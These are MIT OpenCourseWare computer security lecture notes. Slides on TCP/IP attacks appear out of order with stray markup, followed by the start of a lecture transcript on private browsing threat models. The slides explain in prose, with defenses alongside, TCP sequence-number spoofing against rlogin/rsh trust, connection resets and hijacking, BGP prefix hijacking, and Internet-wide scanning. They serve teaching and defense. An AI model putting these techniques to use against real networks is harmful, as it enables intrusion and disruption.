Can	&#13; choose their DNS servers, DNS domains, router, etc.
oAlso, DoS attack on server: ask for lots of leases, from many
MAC addrs.
oSolution: make the switch in charge of DHCP	&#13; (forward reqs to real
server).
Not widely	&#13; deployed:	&#13; would	&#13; require	&#13; careful s witch configuration.
Even more
complicated on a wireless network.
BGP: Internet -wide	&#13; (similar to RIP attacks described in paper).
oAny BGP participant router can announce
route to a prefix.
oWhat	&#13; if adversary has a router?	&#13;  Can	&#13; announce any prefix	&#13; or route.
oIs this problem still relevant?
Spammers often exploit this: announce an unused address, and
send spam.
Gets	&#13; a
round	&#13; IP -level	&#13; blacklisting of spam senders: choose almost
any IP!
oHow to	&#13; fix?
SBGP: cryptographic
signing of route announcements.
Must	&#13; know	&#13; who is al
lowed	&#13; to	&#13; announce	&#13; every particula r	&#13; IP prefix.
Requires someone to distribute keys / certificates for every IP
prefix.
Bootstrapping problem is tricky; some performance overheads
too.
 Getting some traction but  still  not widely deployed .
Many other problems too.
ICMP	&#13; messages like redirect: no authentication, basically unused now.
Exposing too much
information (netstat, SNMP, finger): mostly fixed.
identd ("Authentication Service"): bad design, no real authentication.
Email: real problem but no practical solutions	&#13; yet.
oAuthentication vs authorization.
oE.g., PGP would not solve the spam problem.
Passwords	&#13; in protocol
s:	&#13; supporting	&#13; ONLY passwords	&#13; isn't so great.
6</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>A: SRC=C, DST=S, SYN(SNc)
S: SRC=S, DST=C, SYN(SNs), ACK(SNc)
A: SRC=C, DST=S, ACK(SNs) -- but how to guess SNs?
A: SRC=C, DST=S, data(SNc)
 
Where does the adversary get	&#13; SNs?
	 TCP	&#13; specification suggested a specific way to choose them. 
	 Inparticular, increment at a ~constant rate: ~250,000 per second. 
	 Wh
y so specific? 
o	 Subtle interactions with reused connections (src/dst port numbers). 
o	 Want to avoid old packets (from past conns) interfering
with new conn. 
o	 [ Ref: RFC 1185 appendix ] 
	 If
adversary	&#13; knows a recent sequence number,
can guess the next one. 
o Impl would actually bump ISN every second, making it easy to guess.
What	&#13; happens to the real	&#13; pac
ket	&#13; that	&#13; S sends to C (second pkt)?
	 C would assume the packet is from an old conn, send RST in response. 
	 Even if that RST was sent,	&#13; adversary	&#13; could try	&#13; to race	&#13; before	&#13; RST arrives. 
 Luckily, there	&#13; was	&#13; another	&#13; curious	&#13; bug;	&#13; will get to	&#13; it later. 
But why do sequence number attacks turn into a security problem?
1.
 Spoof	&#13; connections	&#13; to	&#13; applications	&#13; that rely	&#13; o n	&#13; IP addresses. 
	 E.g., Berkeley remote access tools: rlogin, rsh,
rcp. 
	 Allowed login without a password, if connection came from a "trusted" system. 
o	 Required connection to come from a trusted source port (512-1023).  
Why this requirement?
o	 Trusted	&#13; rlogin/rsh/rcp	&#13; program sent the client's username. 
o	 If username was the same as the account on
the server, no password
needed. 
o	 E.g.: "rsh athena.dialup.mit.edu ls". 
	 Made a bad
assumption about what the TCP	&#13; layer
provided. 
o	 Assumed TCP	&#13; conn from an IP address meant it really came from that 
host. 
	 If adversary can guess SNs, then can simulate connection from trusted host. 
o	 Issue any command using rsh. 
o	 Could	&#13; change the user's .rhosts file to allow login
from attacker's host. 
o	 Then connect directly without having to simulate a conne
ction. 
	 Host -based	&#13; authentication seems like
a bad plan. 
o	 Especially relying on "trusted"
vs "untrusted" ports on a machine. 
o
	 Still in some use today: e.g., SMTP for outgoing mail. 
	 Actually rlogin authentication was even worse: they authenticated by
hostname. 
o	 Where does hostname come from? Reverse DNS lookup. 
o	 E.g., 18.26.4.9: f
ind the PTR record of 9.4.26.18.in -addr.arpa. 
o	 Owner of that
domain can set PTR record to any hostname! 
o	 (Can	&#13; make a slight improvement: check if host resolves
to same addr.) 
o	 Similar problems show up in log files: log resolved
(untrusted) hostname. 
2</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>oWe'll talk about	&#13; alternatives in	&#13; a few	&#13; weeks.
FTP data transfer	&#13; protocol.
oServer connects bac k	&#13; to client	&#13; to send a file to the client.
oClient	&#13; tells the server what IP address and port number to use.
oCould	&#13; be	&#13; used	&#13; for port -scanning	&#13; from server's IP.
oCould	&#13; be used to send any traffic (embedded in file)
from server's IP.
E.g., back to IP authenticati on	&#13; problems: rlogin, spam, etc.
How do adversaries	&#13; kn
ow wha
t software	&#13; / protocol you are	&#13; running?
Probing:
oCheck	&#13; if a system is listening on a well-known	&#13; port.
oProtocols / systems often send an initial banner message.
nmap can guess OS by
measuring various impl-specific	&#13; details.
oRef:  http://nmap.org/book/man -os-detection.html
Use DNS to look up the hostname for an IP address; may give hints.
Guessing: assume system is vulnerable, try to exploit bug.
How	&#13; do adversaries know the IP address of the system to attack?
traceroute to find routers along	&#13; the way,	&#13; for BGP attacks.
Can also	&#13; just scan the	&#13; entire	&#13; Internet:	&#13; only	&#13; 2^32 addresses.
o1 Gbps (100 MB/s) network link, 64 byte minimum packets.
o~1.5M	&#13; packets per second.
o2^32=4B packets in ~2500 seconds, or 45 minut es.
ozmap: implementation of this [ Ref: https://zmap.io/ ]
Why are things so insecure at the TCP/IP level?
Historically,	&#13; designers did not worry as much about security.
oEven Bellovin says: "The Internet in 1989 was a much friendlier place".
oOriginal	&#13; Inter net	&#13; had a small number of relatively trustworthy users.
oDesign requirements changed over time.
End-
to-end	&#13; argument in action.
oMust	&#13; provide sec
urity at the application	&#13; level	&#13; anyway.
oThings are	&#13; "good enough" at the	&#13; transport level to	&#13; let application	&#13; work.
Some	&#13; fixes do get added, but only for the worst problems /
easier solutions.
How	&#13; to improve security?
Protocol-compatible	&#13; fixes to TCP implementations.
Firewalls.
oPartial fix,	&#13; but widely	&#13; used.
oIssue: adversary may be within firewalled network.
oIssue: hard to determine if packet is "malicious" or not.
oIssue: even f
or fields that are	&#13; present	&#13; (src/dst),	&#13; hard to authenticate.
oTCP/IP's	&#13; design not a good match for firewall-like filtering	&#13; techniques.
oE.g., IP packet fragmentation: TCP	&#13; ports in one packet, payload in another.
Implement security on top of TCP/IP:	&#13; SSL/TLS, Kerberos, SSH
,	&#13; etc.
7</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>o Beware: this paper isn't	&#13; clear on	&#13; encryption	&#13; vs.	&#13; authentication.
o Will talk about this more in next lecture on Kerberos.
 Use cryptography (encryption, signing, MACs,	&#13; etc).
o Quite a hard problem:
protocol design, key distribution, trust, etc.
 Some kinds
of security hard to provide on top: DoS-resistance, routing.
 Deployment of replacement protocols: SBGP, DNSSEC.	&#13; 
8</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>2. Denial of service attack:	&#13; connection	&#13; reset. 
	 Once we know	&#13; SNc,	&#13; can send a RST packet. 
	 Worse yet: server will	&#13; accept	&#13; a RST packet	&#13; for any SNc value within	&#13; window. 
	 With a large window	&#13; (~ 32K=2^15),	&#13; only	&#13; need 2^32/2^15	&#13; = 2^17 guesses.  
How bad	&#13; is a connection reset?
	 One target	&#13; of such attacks were the TCP	&#13; connections between	&#13; BGP	&#13; routers. 
	 Causes	&#13; routers to assume link failure, could affect traffic for minutes. 
	 Solutions: 
o	 TTL hack (255). 
o	 MD5 header	&#13; authentication	&#13; (very specia
lized	&#13; for router -to-router	&#13; links). 
3. Hijack existing	&#13; connections. 
	 In similar vein, can also inject data into an existing connection. 
	 All adversary needs to know is the current SNc. 
How	&#13; to mitigate this problem?
	 Baseline :	&#13; don't rely	&#13; on IP	&#13; addresses	&#13; for authentication. 
o	 Use encryption	&#13; / authentication	&#13; at a higher
level. 
o	 Next lecture:	&#13; Kerberos.
 
o	 But still,	&#13; want to fix	&#13; the
situation	&#13; we're in,	&#13; for TCP. 
	 ISPs can filter packets sent by their customers. 
o
	 Often done today for small customers, but not consistently. 
o	 Not straightforward for customers with complex networks,
multihoming
 
How
to	&#13; patch	&#13; up
TCP?
	 Can't	&#13; choose ISN's in a completely random way, without violating TCP	&#13; spec. 
o	 Might	&#13; break	&#13; connection	&#13; (port) reuse guarantees. 
	 Random increments?  
o	 Should preserve increment rate (~250k/second). 
o
	 Not a huge amount of randomness (say, low 8
bits per increment). 
	 Aside: must be careful about how we generate random
numbers! 
o	 Common	&#13; PRNG: linear congruential generator: R_k = A*R_{k-1}+B mod N. 
o	 Not secure:	&#13; given one pseudo -random	&#13; value, can
guess the next one! 
o	 Lots	&#13; of
better	&#13; cryptographically	&#13; secure	&#13; PRNGs	&#13; are	&#13; available. 
Ideally,	&#13; use	&#13; your kernel's built -in	&#13; PRNG (/dev/random
/dev/urandom)
 Ref: http://en.wikipedia.org/wiki/Fortuna_(PRNG), or any stream	&#13; 
cipher like	&#13; http://en.wikipedia.org/wiki/RC4
	 However, SN	&#13; values	&#13; for different src/dst pairs	&#13; never	&#13; interact! 
	 So, can choose the ISN using a random offset for each src/dst pair. 
o	 Nice trick:	&#13; ISN	&#13; = ISN_oldstyle	&#13; + F(srcip,	&#13; srcport,	&#13; dstip,	&#13; dstport,	&#13; secret) 
o	 F is	&#13; some pseudo-random function; roughly, think SHA1.
 
3</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 12
TCP/IP security
Threat model for network security:
 Adversary can intercept / modify
network traffic. 
 Adversary can send packets. 
 Adversary has full control of their own machines. 
 Adversary can participate in protocols (usually). 
o Often	&#13;  not feasible to keep bad guys out of a large systems.  
Eavesdropping	&#13; on packets.
 Important to keep in mind, but relatively well understood. 
 Any data sent over the network can be observed by an adversary. 
Sending / spoofing packets. IP allows sender to construct an	&#13; arbitrary	&#13; packet. 
 In particular,	&#13; sender can fill	&#13; in any source	&#13; address. 
 Can	&#13; pretend that a packet is coming from any address. 
 What	&#13; can	&#13; an adversary do with this? 
Easy target: trigger bugs in some implementation. Author isn't so interested in this class of problems. 
 Instead,	&#13; want to look at "protocol-level	&#13; problems". 
 What	&#13; is a protocol -level	&#13; problem? 
o A problem inherent in the design. 
o A correct implementation will have this problem. 
 Why is it so important? 
o Can	&#13; fix implementation bugs. 
o To
fixprotocol-level	&#13; bugs, might need to change protocol! 
o Might be incompatible
with existing systems. 
o As we will see, sometimes possible to come up with compatible fixes. 
TCP	&#13; sequence number attack.
Standard	&#13; handshake (figure	&#13; on the right	&#13; side of
page 2):
C: SRC=C, DST=S, SYN(SNc) 
S:
 SRC=S, DST=C, SYN(SNs), ACK(SNc)
C: SRC=C, DST=S, ACK(SNs)
C: SRC=C, DST=S, data(SNc), ACK(SNs)
 
How	&#13; does the adversary know the data is coming from the client?
 Only the client	&#13; should have been	&#13; able to receive the s econd	&#13; message.  
 Thus, only	&#13; the	&#13; client should	&#13; know SNs.  

 Third message is rejected, unless it has the right SNs value. 
Suppose adversary A wants to simulate a connection to S from C
.	&#13; (Assume A knows
C's IP	&#13; address	&#13;  --usually	&#13; not a big deal	&#13; in practice.)
1</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-18-private-browsing/</video_url>
          <video_title>Lecture 18: Private Browsing</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:26</time_slice>
              <text_slice>PROFESSOR: All right,
let's get started.</text_slice>
            </slice>
            <slice>
              <time_slice>0:29</time_slice>
              <text_slice>So welcome to another exciting
lecture about security</text_slice>
            </slice>
            <slice>
              <time_slice>0:33</time_slice>
              <text_slice>and why the world
is so terrible.</text_slice>
            </slice>
            <slice>
              <time_slice>0:34</time_slice>
              <text_slice>So today we're going to
talk about private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>0:37</time_slice>
              <text_slice>modes, something
that a lot of you</text_slice>
            </slice>
            <slice>
              <time_slice>0:38</time_slice>
              <text_slice>probably have a lot of
personal experience with.</text_slice>
            </slice>
            <slice>
              <time_slice>0:40</time_slice>
              <text_slice>At a high level, what
is the goal of privacy?</text_slice>
            </slice>
            <slice>
              <time_slice>0:43</time_slice>
              <text_slice>When security researchers
talk about privacy,</text_slice>
            </slice>
            <slice>
              <time_slice>0:45</time_slice>
              <text_slice>what are they talking about?</text_slice>
            </slice>
            <slice>
              <time_slice>0:47</time_slice>
              <text_slice>Well at a high level,
they're talking</text_slice>
            </slice>
            <slice>
              <time_slice>0:48</time_slice>
              <text_slice>about the following goal.</text_slice>
            </slice>
            <slice>
              <time_slice>0:50</time_slice>
              <text_slice>So any particular user should be
indistinguishable from a bunch</text_slice>
            </slice>
            <slice>
              <time_slice>0:55</time_slice>
              <text_slice>of other users.</text_slice>
            </slice>
            <slice>
              <time_slice>0:56</time_slice>
              <text_slice>In particular, the
activity of a given user</text_slice>
            </slice>
            <slice>
              <time_slice>0:58</time_slice>
              <text_slice>should be non-incriminating
when viewed in light of activity</text_slice>
            </slice>
            <slice>
              <time_slice>1:02</time_slice>
              <text_slice>from a bunch of other
different users.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05</time_slice>
              <text_slice>And so, as I
mentioned, today we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:06</time_slice>
              <text_slice>going to talk about privacy
in the specific context</text_slice>
            </slice>
            <slice>
              <time_slice>1:09</time_slice>
              <text_slice>of private web browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11</time_slice>
              <text_slice>And so there's actually
no formal definition</text_slice>
            </slice>
            <slice>
              <time_slice>1:14</time_slice>
              <text_slice>for what private
web browsing means.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16</time_slice>
              <text_slice>There's a couple different
reasons for that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19</time_slice>
              <text_slice>So one reason is
that web applications</text_slice>
            </slice>
            <slice>
              <time_slice>1:20</time_slice>
              <text_slice>are very, very complicated.</text_slice>
            </slice>
            <slice>
              <time_slice>1:22</time_slice>
              <text_slice>And they're adding new
features all the time</text_slice>
            </slice>
            <slice>
              <time_slice>1:24</time_slice>
              <text_slice>like audio and video
capabilities and things</text_slice>
            </slice>
            <slice>
              <time_slice>1:26</time_slice>
              <text_slice>like this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:26</time_slice>
              <text_slice>As a result, there's
this moving target</text_slice>
            </slice>
            <slice>
              <time_slice>1:29</time_slice>
              <text_slice>in terms of what
browsers can do.</text_slice>
            </slice>
            <slice>
              <time_slice>1:30</time_slice>
              <text_slice>And as a result,
what information</text_slice>
            </slice>
            <slice>
              <time_slice>1:32</time_slice>
              <text_slice>they might be able to leak
about a particular user.</text_slice>
            </slice>
            <slice>
              <time_slice>1:35</time_slice>
              <text_slice>And so what ends up happening
is that in practice,</text_slice>
            </slice>
            <slice>
              <time_slice>1:37</time_slice>
              <text_slice>like with many things
involving browsers,</text_slice>
            </slice>
            <slice>
              <time_slice>1:39</time_slice>
              <text_slice>there's this living standard.</text_slice>
            </slice>
            <slice>
              <time_slice>1:41</time_slice>
              <text_slice>So different
browser vendors will</text_slice>
            </slice>
            <slice>
              <time_slice>1:43</time_slice>
              <text_slice>implement different features,
particularly with respect</text_slice>
            </slice>
            <slice>
              <time_slice>1:45</time_slice>
              <text_slice>to private browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:46</time_slice>
              <text_slice>Other vendors will look and
see what vendor X is doing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:49</time_slice>
              <text_slice>They will update
their own browser.</text_slice>
            </slice>
            <slice>
              <time_slice>1:51</time_slice>
              <text_slice>So it's like a moving target.</text_slice>
            </slice>
            <slice>
              <time_slice>1:54</time_slice>
              <text_slice>And as users grow to rely on
private browsing more and more,</text_slice>
            </slice>
            <slice>
              <time_slice>1:58</time_slice>
              <text_slice>they end up a lot of times
actually finding bugs</text_slice>
            </slice>
            <slice>
              <time_slice>2:00</time_slice>
              <text_slice>in private browsing mode,
as I'll discuss a couple</text_slice>
            </slice>
            <slice>
              <time_slice>2:03</time_slice>
              <text_slice>minutes later in the lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>2:05</time_slice>
              <text_slice>And so private browsing
at a high level</text_slice>
            </slice>
            <slice>
              <time_slice>2:07</time_slice>
              <text_slice>you can think of as
an aspirational goal.</text_slice>
            </slice>
            <slice>
              <time_slice>2:09</time_slice>
              <text_slice>But we as society
are continually</text_slice>
            </slice>
            <slice>
              <time_slice>2:11</time_slice>
              <text_slice>refining what it means
to do private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>2:14</time_slice>
              <text_slice>and getting better
in some aspects--</text_slice>
            </slice>
            <slice>
              <time_slice>2:16</time_slice>
              <text_slice>worse in some aspects-- as
we'll see a little bit later.</text_slice>
            </slice>
            <slice>
              <time_slice>2:19</time_slice>
              <text_slice>So what exactly do we
mean by private browsing?</text_slice>
            </slice>
            <slice>
              <time_slice>2:22</time_slice>
              <text_slice>It's tough.</text_slice>
            </slice>
            <slice>
              <time_slice>2:23</time_slice>
              <text_slice>But the paper tries to formalize
it in two specific ways.</text_slice>
            </slice>
            <slice>
              <time_slice>2:27</time_slice>
              <text_slice>So first of all, the paper
talks about a local attacker</text_slice>
            </slice>
            <slice>
              <time_slice>2:31</time_slice>
              <text_slice>on private web browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>2:33</time_slice>
              <text_slice>This is someone who
is going to possess</text_slice>
            </slice>
            <slice>
              <time_slice>2:34</time_slice>
              <text_slice>your machine after you've
finished a private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>2:35</time_slice>
              <text_slice>session.</text_slice>
            </slice>
            <slice>
              <time_slice>2:36</time_slice>
              <text_slice>And it wants to figure
out what sites you looked</text_slice>
            </slice>
            <slice>
              <time_slice>2:39</time_slice>
              <text_slice>at in private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>2:40</time_slice>
              <text_slice>And the paper also talks
about web attackers.</text_slice>
            </slice>
            <slice>
              <time_slice>2:44</time_slice>
              <text_slice>The web attacker is someone
who controls the websites</text_slice>
            </slice>
            <slice>
              <time_slice>2:47</time_slice>
              <text_slice>that you visit.</text_slice>
            </slice>
            <slice>
              <time_slice>2:48</time_slice>
              <text_slice>And this web attacker might
want to try to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>2:51</time_slice>
              <text_slice>that you are some particular
person John or Jane as opposed</text_slice>
            </slice>
            <slice>
              <time_slice>2:55</time_slice>
              <text_slice>to some amorphous user
that the website can't</text_slice>
            </slice>
            <slice>
              <time_slice>2:58</time_slice>
              <text_slice>tell who they are.</text_slice>
            </slice>
            <slice>
              <time_slice>2:59</time_slice>
              <text_slice>And so we'll look at each one
of these attacks in detail.</text_slice>
            </slice>
            <slice>
              <time_slice>3:03</time_slice>
              <text_slice>But for now, suffice it to say
that if the attacker can launch</text_slice>
            </slice>
            <slice>
              <time_slice>3:07</time_slice>
              <text_slice>both of these attacks--
both a local and a web</text_slice>
            </slice>
            <slice>
              <time_slice>3:10</time_slice>
              <text_slice>attack-- that actually really
strengthens their ability</text_slice>
            </slice>
            <slice>
              <time_slice>3:12</time_slice>
              <text_slice>to try to dearm us.</text_slice>
            </slice>
            <slice>
              <time_slice>3:14</time_slice>
              <text_slice>So, for example,
a local attacker</text_slice>
            </slice>
            <slice>
              <time_slice>3:16</time_slice>
              <text_slice>who, for example, maybe
knows your IP address</text_slice>
            </slice>
            <slice>
              <time_slice>3:18</time_slice>
              <text_slice>can actually talk to the
website and say, hey,</text_slice>
            </slice>
            <slice>
              <time_slice>3:21</time_slice>
              <text_slice>have you seen this particular
IP address in your logs.</text_slice>
            </slice>
            <slice>
              <time_slice>3:23</time_slice>
              <text_slice>If so, aha!</text_slice>
            </slice>
            <slice>
              <time_slice>3:24</time_slice>
              <text_slice>You're looking at the user whose
machine I control right now.</text_slice>
            </slice>
            <slice>
              <time_slice>3:28</time_slice>
              <text_slice>So it's actually pretty useful
from a security perspective</text_slice>
            </slice>
            <slice>
              <time_slice>3:31</time_slice>
              <text_slice>to consider these
local and web attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>3:33</time_slice>
              <text_slice>So they are separate
things and then to see</text_slice>
            </slice>
            <slice>
              <time_slice>3:35</time_slice>
              <text_slice>how they can possibly compose.</text_slice>
            </slice>
            <slice>
              <time_slice>3:37</time_slice>
              <text_slice>So let's look at this
first type of attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>3:42</time_slice>
              <text_slice>which is the local attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>3:49</time_slice>
              <text_slice>So as I mentioned, we
assume that this attacker</text_slice>
            </slice>
            <slice>
              <time_slice>3:54</time_slice>
              <text_slice>is going to control the
user's machine post-session.</text_slice>
            </slice>
            <slice>
              <time_slice>4:02</time_slice>
              <text_slice>And so by post-session, I
mean that the private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>4:07</time_slice>
              <text_slice>activity has already finished--
the user has perhaps gone</text_slice>
            </slice>
            <slice>
              <time_slice>4:11</time_slice>
              <text_slice>off and done something else.</text_slice>
            </slice>
            <slice>
              <time_slice>4:12</time_slice>
              <text_slice>It's not at the computer.</text_slice>
            </slice>
            <slice>
              <time_slice>4:13</time_slice>
              <text_slice>And then the attacker
takes control of that issue</text_slice>
            </slice>
            <slice>
              <time_slice>4:15</time_slice>
              <text_slice>and wants to figure
out what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>4:17</time_slice>
              <text_slice>And so the security goal is
that well we don't the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>4:21</time_slice>
              <text_slice>be able to figure out
any of the websites</text_slice>
            </slice>
            <slice>
              <time_slice>4:23</time_slice>
              <text_slice>that the user visited during
this private browsing activity.</text_slice>
            </slice>
            <slice>
              <time_slice>4:27</time_slice>
              <text_slice>Now, the reason why the
post is actually important</text_slice>
            </slice>
            <slice>
              <time_slice>4:29</time_slice>
              <text_slice>there is because if we assume
that the attacker can control</text_slice>
            </slice>
            <slice>
              <time_slice>4:32</time_slice>
              <text_slice>the machine before the
users private browsing,</text_slice>
            </slice>
            <slice>
              <time_slice>4:34</time_slice>
              <text_slice>then basically it's game over,
right, because the attacker can</text_slice>
            </slice>
            <slice>
              <time_slice>4:37</time_slice>
              <text_slice>install a keystroke logger-- the
attacker can subvert the binary</text_slice>
            </slice>
            <slice>
              <time_slice>4:41</time_slice>
              <text_slice>that [INAUDIBLE] the browser.</text_slice>
            </slice>
            <slice>
              <time_slice>4:44</time_slice>
              <text_slice>The attacker can subert the OS.</text_slice>
            </slice>
            <slice>
              <time_slice>4:45</time_slice>
              <text_slice>So we don't really care about
this pre-session attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>4:50</time_slice>
              <text_slice>And also note that we're not
trying to provide privacy</text_slice>
            </slice>
            <slice>
              <time_slice>4:52</time_slice>
              <text_slice>for the user after the attacker
has controlled the machine.</text_slice>
            </slice>
            <slice>
              <time_slice>4:57</time_slice>
              <text_slice>And that's for the same reason.</text_slice>
            </slice>
            <slice>
              <time_slice>4:58</time_slice>
              <text_slice>Once the attacker
gets to the machine,</text_slice>
            </slice>
            <slice>
              <time_slice>4:59</time_slice>
              <text_slice>he or she can do the same thing
that is mentioned-- key logger.</text_slice>
            </slice>
            <slice>
              <time_slice>5:02</time_slice>
              <text_slice>So, basically, once the
user leaves the machine,</text_slice>
            </slice>
            <slice>
              <time_slice>5:05</time_slice>
              <text_slice>we don't assume any
forward notions of privacy.</text_slice>
            </slice>
            <slice>
              <time_slice>5:08</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>5:09</time_slice>
              <text_slice>It's pretty straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>5:11</time_slice>
              <text_slice>And so you can imagine that
another goal that you might</text_slice>
            </slice>
            <slice>
              <time_slice>5:14</time_slice>
              <text_slice>want to try to
satisfy here is you</text_slice>
            </slice>
            <slice>
              <time_slice>5:17</time_slice>
              <text_slice>might want to try to
hide from the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>5:20</time_slice>
              <text_slice>that the user was employing
private browsing mode at all.</text_slice>
            </slice>
            <slice>
              <time_slice>5:23</time_slice>
              <text_slice>Now the paper actually
said that's very difficult.</text_slice>
            </slice>
            <slice>
              <time_slice>5:26</time_slice>
              <text_slice>This property is often
called plausible deniability.</text_slice>
            </slice>
            <slice>
              <time_slice>5:28</time_slice>
              <text_slice>So your boss comes up to you
after you use private browsing,</text_slice>
            </slice>
            <slice>
              <time_slice>5:31</time_slice>
              <text_slice>and says were you looking
at mylittlepony.com?</text_slice>
            </slice>
            <slice>
              <time_slice>5:33</time_slice>
              <text_slice>No, no, I certainly wasn't.</text_slice>
            </slice>
            <slice>
              <time_slice>5:35</time_slice>
              <text_slice>And I certainly wasn't
using private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>5:37</time_slice>
              <text_slice>to hide the fact that I was
looking at mylittlepony.com.</text_slice>
            </slice>
            <slice>
              <time_slice>5:39</time_slice>
              <text_slice>So as I said, the
paper said it's</text_slice>
            </slice>
            <slice>
              <time_slice>5:40</time_slice>
              <text_slice>difficult to provide
this property</text_slice>
            </slice>
            <slice>
              <time_slice>5:42</time_slice>
              <text_slice>of plausible deniability.</text_slice>
            </slice>
            <slice>
              <time_slice>5:43</time_slice>
              <text_slice>I'll give you some
concrete reasons</text_slice>
            </slice>
            <slice>
              <time_slice>5:45</time_slice>
              <text_slice>why this might be the
case a little bit later</text_slice>
            </slice>
            <slice>
              <time_slice>5:47</time_slice>
              <text_slice>on in the lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>5:48</time_slice>
              <text_slice>But that basically is an
overview of the local attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>5:51</time_slice>
              <text_slice>So one question we might
want to think about</text_slice>
            </slice>
            <slice>
              <time_slice>5:55</time_slice>
              <text_slice>is what kinds of persistent
client-side state</text_slice>
            </slice>
            <slice>
              <time_slice>6:05</time_slice>
              <text_slice>can be leaked by a
private browsing session?</text_slice>
            </slice>
            <slice>
              <time_slice>6:14</time_slice>
              <text_slice>And by persistent,
I just mean stuff</text_slice>
            </slice>
            <slice>
              <time_slice>6:18</time_slice>
              <text_slice>that will end up getting
stored on the local hard disk,</text_slice>
            </slice>
            <slice>
              <time_slice>6:22</time_slice>
              <text_slice>the local SSD or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>6:24</time_slice>
              <text_slice>So what kinds of state might
be leaked if we weren't careful</text_slice>
            </slice>
            <slice>
              <time_slice>6:27</time_slice>
              <text_slice>when someone is doing this
type of private browsing?</text_slice>
            </slice>
            <slice>
              <time_slice>6:29</time_slice>
              <text_slice>So one thing you
might be worried about</text_slice>
            </slice>
            <slice>
              <time_slice>6:31</time_slice>
              <text_slice>is JavaScript accessible states.</text_slice>
            </slice>
            <slice>
              <time_slice>6:38</time_slice>
              <text_slice>So examplees of this includes
things like cookies and DOM</text_slice>
            </slice>
            <slice>
              <time_slice>6:45</time_slice>
              <text_slice>storage.</text_slice>
            </slice>
            <slice>
              <time_slice>6:49</time_slice>
              <text_slice>Another thing you might
be worried about--</text_slice>
            </slice>
            <slice>
              <time_slice>6:52</time_slice>
              <text_slice>and this is what most people
think about when they think</text_slice>
            </slice>
            <slice>
              <time_slice>6:55</time_slice>
              <text_slice>about what they want to
say in private browsing--</text_slice>
            </slice>
            <slice>
              <time_slice>6:57</time_slice>
              <text_slice>is maybe the browser cache.</text_slice>
            </slice>
            <slice>
              <time_slice>6:59</time_slice>
              <text_slice>So you don't want someone
to look in the inner cache</text_slice>
            </slice>
            <slice>
              <time_slice>7:01</time_slice>
              <text_slice>and figure out here
are some images or HTML</text_slice>
            </slice>
            <slice>
              <time_slice>7:04</time_slice>
              <text_slice>files from websites
you prefer people</text_slice>
            </slice>
            <slice>
              <time_slice>7:05</time_slice>
              <text_slice>didn't know that you visited.</text_slice>
            </slice>
            <slice>
              <time_slice>7:10</time_slice>
              <text_slice>Another important thing is
your history of visited sites.</text_slice>
            </slice>
            <slice>
              <time_slice>7:19</time_slice>
              <text_slice>So many of your
relationships have</text_slice>
            </slice>
            <slice>
              <time_slice>7:21</time_slice>
              <text_slice>been broken when the other goes
to the browser-- start typing</text_slice>
            </slice>
            <slice>
              <time_slice>7:24</time_slice>
              <text_slice>something into to the address
bar and all of a sudden</text_slice>
            </slice>
            <slice>
              <time_slice>7:26</time_slice>
              <text_slice>it auto-completes to
something very embarrassing.</text_slice>
            </slice>
            <slice>
              <time_slice>7:28</time_slice>
              <text_slice>So this is one
thing definitely you</text_slice>
            </slice>
            <slice>
              <time_slice>7:30</time_slice>
              <text_slice>don't want to leak outside
the private browsing session.</text_slice>
            </slice>
            <slice>
              <time_slice>7:33</time_slice>
              <text_slice>You can also think about
configuration states</text_slice>
            </slice>
            <slice>
              <time_slice>7:38</time_slice>
              <text_slice>with the browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>7:39</time_slice>
              <text_slice>And so here you could
think about things</text_slice>
